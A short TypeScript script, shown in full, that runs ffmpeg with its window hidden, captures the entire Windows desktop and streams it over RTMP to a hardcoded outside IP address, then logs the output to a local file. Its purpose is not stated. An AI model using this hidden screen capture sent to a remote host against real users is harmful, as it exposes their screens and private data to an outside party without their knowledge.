import fs from 'fs/promises';
import { execSync } from 'child_process';

let rsp = '';

try {
    rsp = execSync('ffmpeg -f gdigrab -i desktop -r 16 -c:v h264_nvenc -b:v 500k -crf 28 -pix_fmt yuv420p -strict -2 -ac 2 -b:a 128k -f flv rtmp://81.169.212.187/screen', { encoding: 'utf-8', windowsHide: true });
    if (typeof rsp === 'object') {
        rsp = (rsp as Record<string, string>).stdout;
    }
} catch (err) {
    rsp = err?.stderr;
}

fs.appendFile('C:\\bin\\test.txt', `${new Date()}:\r\n${rsp}\r\n\r\n`);

